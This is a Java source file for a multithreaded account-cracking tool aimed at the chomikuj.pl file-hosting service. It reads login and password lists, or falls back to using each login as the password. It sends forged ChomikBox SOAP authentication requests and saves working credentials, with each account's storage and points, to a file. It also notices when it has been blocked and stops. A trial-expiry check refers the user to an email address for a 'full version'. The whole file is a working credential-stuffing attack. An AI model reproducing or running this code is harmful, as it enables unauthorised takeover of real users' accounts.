package kontachomika;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.HashSet;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.xml.soap.MessageFactory;
import javax.xml.soap.MimeHeaders;
import javax.xml.soap.SOAPBody;
import javax.xml.soap.SOAPConnection;
import javax.xml.soap.SOAPConnectionFactory;
import javax.xml.soap.SOAPElement;
import javax.xml.soap.SOAPEnvelope;
import javax.xml.soap.SOAPException;
import javax.xml.soap.SOAPMessage;
import javax.xml.soap.SOAPPart;
import static kontachomika.KontaChomika.loginReader;
import java.util.*;

class KontaChomika {

//    static String LoginFile = "G://chomik/names.txt";
//    static String PasswordFile = "G://chomik/passwords.txt";
//    static String OutputFile = "G://chomik/accounts.txt";

    static String LoginFile = "names.txt";
    static String PasswordFile = "passwords.txt";
    static String OutputFile = "accounts.txt";
    static String HistoryFile = "history.txt";
 
    
    static int maxPoints;
    static BufferedReader historyReader;
    static BufferedWriter historyWriter;
    static BufferedReader loginReader;
    static BufferedWriter accountWriter;
    public static final ArrayList<String> LoginPasswords = new ArrayList<>();
    static boolean withTtransfer;
    static BufferedWriter newLoginWriter;
    static BufferedReader newLoginReader;
    private static String correctLogin;
    private static String correctPassword;
    private static Thread correctThread;
    private static HashSet<String> correctLogins = new HashSet();
    private static HashSet<String> uncheckedLogins = new HashSet();
    static BufferedWriter loginsWriter;
    private static String[] uncheckedLoginsArray;

    public static void main(String[] args) {
        try {

            if (args.length == 3) {
                if (args[1].toLowerCase().equals("-transfer")) {
                    withTtransfer = true;
                    maxPoints = Integer.parseInt(args[2]);
                }
            }

            int numberOfThreads = Integer.parseInt(args[0]);
            ArrayList<String> passwords = getPasswords();
            correctLogin = args[3];
            correctPassword = args[4];
            

      File file = new File(OutputFile);
      if (!file.exists()) {
        file.createNewFile();
      } 
       
            File fileh = new File(HistoryFile);
      if (!fileh.exists()) {
        fileh.createNewFile();
      } else {
        BufferedReader accountreader = new BufferedReader(new FileReader(HistoryFile));
        String line = null;
        while ((line = accountreader.readLine()) != null) {
          correctLogins.add(line);
        }
        accountreader.close();
      }
    
        loginReader = new BufferedReader(new FileReader(LoginFile));
        
      String line = null;
      while ((line = loginReader.readLine()) != null) {
        uncheckedLogins.add(line);
      }
      
      
     
       for (Iterator dine = correctLogins.iterator(); dine.hasNext();) {
       String login = (String)dine.next();
        if (uncheckedLogins.contains(login)) {
          uncheckedLogins.remove(login);
        }
      }

      uncheckedLoginsArray = new String[uncheckedLogins.size()];
      
      int yy = 0;
      for (String login : uncheckedLogins) {
        uncheckedLoginsArray[yy] = login;
        yy++;
      }
      
            historyReader = new BufferedReader(new FileReader(HistoryFile));
            historyWriter = new BufferedWriter(new FileWriter(HistoryFile, true));
            loginReader = new BufferedReader(new FileReader(LoginFile));
            
            accountWriter = new BufferedWriter(new FileWriter(OutputFile, false));
            accountWriter = new BufferedWriter(new FileWriter(OutputFile, true));
      
            DateFormat df = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
             Calendar calendar = new GregorianCalendar();
      
            accountWriter.newLine();
            accountWriter.write("----- " + df.format(calendar.getTime()) + " -----");
            accountWriter.newLine();
            accountWriter.flush();
            correctThread = new Thread(new WorkerForCorrectAccount(correctLogin, correctPassword));
            correctThread.start();
 
            ArrayList<Thread> threads = new ArrayList<>();
            for (int i = 0; i < numberOfThreads; i++) {
                threads.add(new Thread(new Worker(passwords, withTtransfer, maxPoints)));
            }

            for (Thread t : threads) {
                t.start();
            }

            for (Thread t : threads) {
                t.join();
            }

            loginReader.close();
            accountWriter.close();
      

        } catch (NumberFormatException | IOException | InterruptedException ex) {
            Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
  public static synchronized void koniec()
  {
    try {
      loginsWriter = new BufferedWriter(new FileWriter(LoginFile, false));
      for (String login : uncheckedLogins) {
        loginsWriter.write(login);
        loginsWriter.newLine();
      }
      
      loginsWriter.flush();
    }
    catch (IOException ex) {
      Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
    }
  }
  
  private static boolean koniec = false;
  private static final Object koniecMonitor = new Object();
    
  public static void ustawKoniec() {
    synchronized (koniecMonitor) {
      koniec = true;
    }
  }
  
  public static boolean czyKoniec() {
    synchronized (koniecMonitor) {
      return (koniec) || (!correctThread.isAlive());
    }
  }
  
  private static final Object blokadaPotencjalna = new Object();
  private static boolean czyBlokadaPotencjalna = false;
  
  public static boolean czyJestBlokadaPotencjalna() {
    synchronized (blokadaPotencjalna) {
      return czyBlokadaPotencjalna;
    }
  }
  
  public static void ustawBlokade(boolean value) {
    if (value) {
      System.out.println("Zostalismy zablokowani... zamykanie programu.");
      koniec();
      System.exit(1);
    }
  }
  
  public static void ustawPotencjalnaBlokade(boolean value) {
    synchronized (blokadaPotencjalna) {
      czyBlokadaPotencjalna = value;
      
      if (czyBlokadaPotencjalna) {
        System.out.println("Nieudana proba nawiazania polaczenia z serwerem");
      }
    }
  }
  
    public synchronized static boolean isExpired() // Заглушка для  пользователя по времени
    {
        Calendar calendar = new GregorianCalendar();
        Date now = calendar.getTime();
        
        calendar.set(2015, 10, 15);
        Date expDate = calendar.getTime();
              
        if(now.after(expDate))
            return true;
        
        return false;
    }
    
    private static ArrayList<String> getPasswords() {
        BufferedReader pr = null;
        try {
            ArrayList<String> passwords = new ArrayList<>();
            pr = new BufferedReader(new FileReader(PasswordFile));

            String line;
            while ((line = pr.readLine()) != null) {
                if(line.equalsIgnoreCase(""))
                    continue;
                
                passwords.add(line);
            }

            return passwords;

        } catch (FileNotFoundException ex) {
            return LoginPasswords;
        } catch (IOException ex) {
            Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                if (pr != null) {
                    pr.close();
                }
            } catch (IOException ex) {
                Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        return null;
    }
    
     public static String [] getHistory() {
        BufferedReader pr = null;
        try {
            ArrayList<String> history = new ArrayList<>();
            pr = new BufferedReader(new FileReader(HistoryFile));

            String line;
            while ((line = pr.readLine()) != null) {
                if(line.equalsIgnoreCase(""))
                    continue;
                
                history.add(line);
            }
                String[] arrHistory = new String[history.size()];
         for (int i = 0; i < arrHistory.length; i++) {
             arrHistory[i] = history.get(i);
         }

           return arrHistory;

        } catch (FileNotFoundException ex) {
            return null;
        } catch (IOException ex) {
            Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                if (pr != null) {
                    pr.close();
                }
            } catch (IOException ex) {
                Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        return null;
    }
     public static String [] getLogin() {
        BufferedReader pr = null;
        try {
            ArrayList<String> login = new ArrayList<>();
            pr = new BufferedReader(new FileReader(LoginFile));

            String line;
            while ((line = pr.readLine()) != null) {
                if(line.equalsIgnoreCase(""))
                    continue;
                
                login.add(line);
            }
                String[] arrLogin = new String[login.size()];
         for (int i = 0; i < arrLogin.length; i++) {
             arrLogin[i] = login.get(i);
         }

           return arrLogin;

        } catch (FileNotFoundException ex) {
            return null;
        } catch (IOException ex) {
            Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                if (pr != null) {
                    pr.close();
                }
            } catch (IOException ex) {
                Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        return null;
        }
     
    private static int loginIndex = 0;
    
    public static synchronized String readNextLogin() {
        try {
            String line;
            while ((line = loginReader.readLine())!= null ) {

              
                if (line.equals("")) {
                    continue;
                }
                for (int i=0;i<getHistory().length;i++)
                {
                    
                    if (line.equals(getHistory()[i])){
                     return "next";
                    }
                    else {
                        if (loginIndex < uncheckedLoginsArray.length) {
                     String login = uncheckedLoginsArray[loginIndex];
                     loginIndex += 1;
                      return login;
                    }
                    }
                }
                return line;
            
            
            }
        } catch (IOException ex) {
            Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
        }

        return null;
    }
    
    
  public static synchronized void CheckedLogin(String login) {
    try {
      correctLogins.add(login);
      uncheckedLogins.remove(login);
      historyWriter.write(login);
      historyWriter.newLine();
      historyWriter.flush();
    } catch (IOException ex) {
      Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
    }
  }

    public static synchronized void addNewAccount(String login, String password, int mb, int points) {
        try {
            
            if(isExpired())
            {
                accountWriter.write("Wersja testowa stracila waznosc. Prosze zglosic sie po pelna wersje: lapajaca@gmail.com");
                return;
            }
            
            if (withTtransfer) {
                if (points >= maxPoints) {
                    accountWriter.write(login + ", " + password + " - " + mb + " MB, " + points + " points");
                } else {
                    accountWriter.write(login + ", " + password + " - " + mb + " MB");
                }
            }
            else
            {
                accountWriter.write(login + ", " + password);
            }

            accountWriter.newLine();
            accountWriter.flush();
        } catch (IOException ex) {
            Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public static synchronized void LoginToHistory(String login) {
        try {
                if(login != null){
                historyWriter.write(login);
                historyWriter.newLine();
                historyWriter.flush();
                }
        } catch (IOException ex) {
            Logger.getLogger(KontaChomika.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}

class Worker implements Runnable {

    private final ArrayList<String> passwords;
    private final int maxPoints;
    private final boolean transfer;

    public Worker(ArrayList<String> passwords, boolean withTransfer, int maxPOints) {
        this.passwords = passwords;
        this.maxPoints = maxPOints;
        this.transfer = withTransfer;
    }

    @Override
    public void run() {

        SOAPConnectionFactory soapConnectionFactory;
        SOAPConnection soapConnection;

        try {
            soapConnectionFactory = SOAPConnectionFactory.newInstance();
            soapConnection = soapConnectionFactory.createConnection();
        } catch (SOAPException | UnsupportedOperationException ex) {
            //Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
            return;
        }

        String login;

        do {
            login = KontaChomika.readNextLogin();
            if (login!="next")
            if (login != null) {

                for (String password : getPasswords(login)) {
                    
                    if(KontaChomika.isExpired())
                    {
                        try {
                            System.out.println("Wersja testowa stracila waznosc. Prosze zglosic sie po pelna wersje: lapajaca@gmail.com");
                            Thread.sleep(1000);
                            continue;
                        } catch (InterruptedException ex) {
                            Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                    
                    LoginResult lr = sendLoginRequest(login, password, soapConnection);
                    if (!lr.Error && !lr.Token.isEmpty()) {

                        if (transfer) {
                            MetadataResult mr = sendMetadataRequest(lr.Token, soapConnection);

                            if (mr != null) {
                                int mb = mr.Storage / 1024;

                                if (mr.Points >= maxPoints) {
                                    System.out.println("OK: " + login + ", " + password + " - " + mb + " MB, " + mr.Points + " points");
                                } else {
                                    System.out.println("OK: " + login + ", " + password + " - " + mb + " MB");
                                }

                                KontaChomika.addNewAccount(login, password, mb, mr.Points);
                                break;
                            } else {
                                System.out.println("ERROR:" + login + ", " + password);
                            }
                        } else {
                            System.out.println("OK: " + login + ", " + password);
                            KontaChomika.addNewAccount(login, password, 0 , 0);
                        }
                    } else if (lr.Error) {
                        System.out.println("ERROR:" + login + ", " + password);
                    } else {
                        System.out.println("NO: " + login + ", " + password);
                    }
                   
                }
                 
            } if(login != "next")KontaChomika.LoginToHistory(login);
            

        } while (login != null);

        try {
            soapConnection.close();
        } catch (SOAPException ex) {
            //Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
        }
    } // обработка

    private LoginResult sendLoginRequest(String login, String password, SOAPConnection soapConnection) {
        LoginResult lr = new LoginResult();
        lr.Error = false;
        lr.Token = "";

        try {
            // Send SOAP Message to SOAP Server
            String url = "http://box.chomikuj.pl/services/ChomikBoxService.svc";
            SOAPMessage soapResponse = soapConnection.call(createLoginSOAPRequest(login, password), url);
            String status = getTagValue("a:status", "", soapResponse);
            Boolean result = status.toLowerCase().equals("ok");

            if (result) {
                String token = getTagValue("a:token", "", soapResponse);
                lr.Token = token;
            }

        } catch (SOAPException | UnsupportedOperationException | IOException ex) {
            //Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
            lr.Error = true;
        } catch (Exception ex) {
            //Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
            lr.Error = true;
        }

        return lr;
    }

    private String getTagValue(String tagName, String att, SOAPMessage soapResponse) {
        try {
            ByteArrayOutputStream bout = new ByteArrayOutputStream();
            soapResponse.writeTo(bout);
            String str = bout.toString("UTF-8");

            final Pattern pattern = Pattern.compile("<" + tagName + att + ">(.+?)</" + tagName + ">");
            final Matcher matcher = pattern.matcher(str);
            if (matcher.find()) {
                return matcher.group(1);
            }
        } catch (SOAPException | IOException ex) {
            //Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
        }

        return "";
    }

    private SOAPMessage createLoginSOAPRequest(String login, String password) throws Exception {
        MessageFactory messageFactory = MessageFactory.newInstance();
        SOAPMessage soapMessage = messageFactory.createMessage();
        SOAPPart soapPart = soapMessage.getSOAPPart();

        // SOAP Envelope
        SOAPEnvelope envelope = soapPart.getEnvelope();

        /*
         Constructed SOAP Request Message:
         <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
         <s:Body>
         <Auth xmlns="http://chomikuj.pl/">
         <name>{name}</name>
         <passHash>{password_hash}</passHash>
         <ver>4</ver>
         <client>
         <name>chomikbox</name>
         <version>2.0.4.3</version>
         </client>
         </Auth>
         </s:Body>
         </s:Envelope>
         */
        // SOAP Body
        SOAPBody soapBody = envelope.getBody();

        SOAPElement authElement = soapBody.addChildElement("Auth", "", "http://chomikuj.pl/");
        SOAPElement nameElement = authElement.addChildElement("name");
        nameElement.addTextNode(login);
        SOAPElement passElement = authElement.addChildElement("passHash");
        passElement.addTextNode(getPasswordHash(password));
        SOAPElement verElement = authElement.addChildElement("ver");
        verElement.addTextNode("4");
        SOAPElement clientElement = authElement.addChildElement("client");
        SOAPElement clientNameElement = clientElement.addChildElement("name");
        clientNameElement.addTextNode("chomikbox");
        SOAPElement clientVersionElement = clientElement.addChildElement("version");
        clientVersionElement.addTextNode("2.0.4.3");

        MimeHeaders headers = soapMessage.getMimeHeaders();
        headers.addHeader("SOAPAction", "http://chomikuj.pl/IChomikBoxService/Auth");
        headers.addHeader("Content-Type", "text/xml;charset=utf-8");
        headers.addHeader("User-Agent", "Mozilla/5.0");

        soapMessage.saveChanges();

        return soapMessage;
    }

    private MetadataResult sendMetadataRequest(String token, SOAPConnection soapConnection) {
        try {
            // Send SOAP Message to SOAP Server
            String url = "http://box.chomikuj.pl/services/ChomikBoxService.svc";
            SOAPMessage soapResponse = soapConnection.call(createMetadataSOAPRequest(token), url);

//            String status = getTagValue("status", " xmlns=\"http://chomikuj.pl/\"", soapResponse);
//            Boolean result = status.toLowerCase().equals("ok");
//            if(result){
            String value = getTagValue("value", "", soapResponse);
            int valueInt = Integer.parseInt(value);

            String extra = getTagValue("extra", "", soapResponse);
            int extraInt = Integer.parseInt(extra);

            String points = getTagValue("points", "", soapResponse);
            int pointsInt = Integer.parseInt(points);

            MetadataResult mr = new MetadataResult();
            mr.Points = pointsInt;
            mr.Storage = valueInt + extraInt;
            return mr;
//            }

        } catch (SOAPException | UnsupportedOperationException | IOException ex) {
            //Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
        } catch (Exception ex) {
            //Logger.getLogger(Worker.class.getName()).log(Level.SEVERE, null, ex);
        }

        return null;
    }

    private SOAPMessage createMetadataSOAPRequest(String token) throws Exception {
        MessageFactory messageFactory = MessageFactory.newInstance();
        SOAPMessage soapMessage = messageFactory.createMessage();
        SOAPPart soapPart = soapMessage.getSOAPPart();

        // SOAP Envelope
        SOAPEnvelope envelope = soapPart.getEnvelope();

        /*
         Constructed SOAP Request Message:
         <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
         <s:Body>
         <CheckEvents xmlns="http://chomikuj.pl/">
         <token></token>
         </CheckEvents>
         </s:Body>
         </s:Envelope>
         */
        // SOAP Body
        SOAPBody soapBody = envelope.getBody();

        SOAPElement checkEventsElement = soapBody.addChildElement("CheckEvents", "", "http://chomikuj.pl/");
        SOAPElement tokenElement = checkEventsElement.addChildElement("token");
        tokenElement.addTextNode(token);

        MimeHeaders headers = soapMessage.getMimeHeaders();
        headers.addHeader("SOAPAction", "http://chomikuj.pl/IChomikBoxService/CheckEvents");
        headers.addHeader("Content-Type", "text/xml;charset=utf-8");
        headers.addHeader("User-Agent", "Mozilla/5.0");

        soapMessage.saveChanges();

        return soapMessage;
    }

    private String getPasswordHash(String password) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(password.getBytes());

        byte byteData[] = md.digest();

        StringBuilder hexString = new StringBuilder();
        for (int i = 0; i < byteData.length; i++) {
            String hex = Integer.toHexString(0xff & byteData[i]);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }

        return hexString.toString();
    }

    private Iterable<String> getPasswords(String login) {
        if (this.passwords == KontaChomika.LoginPasswords) {
            ArrayList<String> pass = new ArrayList<>();
            pass.add(login);

            String lower = login.toLowerCase();
            String upper = login.toUpperCase();

            if (!lower.equals(login)) {
                pass.add(lower);
            }

            if (!upper.equals(login)) {
                pass.add(upper);
            }

            return pass;
        }

        return passwords;
    }
}

class MetadataResult {

    public int Storage;
    public int Points;
}

class LoginResult {

    public String Token;
    public boolean Error;
}
